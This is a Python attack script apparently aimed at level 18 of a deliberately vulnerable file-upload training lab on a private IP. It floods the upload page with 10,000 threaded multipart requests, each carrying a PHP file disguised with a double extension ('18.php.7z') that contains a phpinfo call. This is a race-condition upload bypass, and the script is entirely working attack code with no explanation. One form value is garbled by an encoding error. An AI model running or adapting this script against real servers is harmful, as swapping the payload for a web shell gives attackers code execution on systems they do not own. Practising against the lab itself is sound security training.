#!/usr/bin/env python
# coding:utf-8
# Build By Cyberpeace

import hackhttp
from multiprocessing.dummy import Pool as ThreadPool


def upload(lists):
    hh = hackhttp.hackhttp()
    raw = """POST /Pass-18/index.php HTTP/1.1
Host: 192.168.99.50
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Referer: http://192.168.99.50/Pass-18/index.php
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=---------------------------220322109030489
Content-Length: 334

-----------------------------220322109030489
Content-Disposition: form-data; name="upload_file"; filename="18.php.7z"
Content-Type: application/octet-stream

<?php phpinfo();?>
-----------------------------220322109030489
Content-Disposition: form-data; name="submit"

ä¸ä¼ 
-----------------------------220322109030489--

"""
    code, head, html, redirect, log = hh.http('http://192.168.99.50/Pass-18/index.php', raw=raw)
    print(str(code) + "\r")


pool = ThreadPool(10)
pool.map(upload, range(10000))
pool.close()
pool.join()
